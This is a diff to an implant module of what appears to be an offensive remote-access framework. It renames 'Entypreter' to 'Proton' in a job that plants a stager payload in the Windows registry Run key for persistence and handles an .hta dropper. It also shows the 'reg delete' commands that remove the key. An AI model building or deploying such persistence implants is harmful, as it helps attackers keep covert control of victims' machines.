@@ -20,7 +20,7 @@ class RegistryJob(core.job.Job):
             self.options.set('DROPFILE', ''.join(random.choice(string.ascii_uppercase) for _ in range(10)))
             self.options.set('FDROPFILE', self.options.get('DROPFILE')+'.hta')
 
-        self.options.set("FHKEY", "entypreter.registry."+self.options.get("HKEY"))
+        self.options.set("FHKEY", "proton.registry."+self.options.get("HKEY"))
         if self.session_id == -1:
             self.error("0", "This job is not yet compatible with ONESHOT stagers.", "ONESHOT job error.", "")
             return False
@@ -44,8 +44,8 @@ class RegistryJob(core.job.Job):
         if task == "AddKey":
             handler.reply(200)
             if data:
-                self.shell.print_good("Entypreter key added to registry.")
-                self.shell.print_command("reg delete "+self.options.get("HKEY")+"\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Entypreter /f")
+                self.shell.print_good("Proton key added to registry.")
+                self.shell.print_command("reg delete "+self.options.get("HKEY")+"\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Proton /f")
             else:
                 self.shell.print_error("Could not add key to registry.")
             return
@@ -56,7 +56,7 @@ class RegistryJob(core.job.Job):
                 self.shell.print_good("Key was removed.")
             else:
                 self.shell.print_error("Key could not be removed.")
-                self.shell.print_command("reg delete "+self.options.get("HKEY")+"\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Entypreter /f")
+                self.shell.print_command("reg delete "+self.options.get("HKEY")+"\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Proton /f")
             return
 
         if task == "AddDropper":
@@ -94,7 +94,7 @@ class RegistryJob(core.job.Job):
 class RegistryImplant(core.implant.Implant):
 
     NAME = "Add Registry Payload"
-    DESCRIPTION = "Adds a entypreter stager payload in the registry."
+    DESCRIPTION = "Adds a proton stager payload in the registry."
     AUTHORS = ["Entynetproject"]
     STATE = "implant/persist/registry"
 
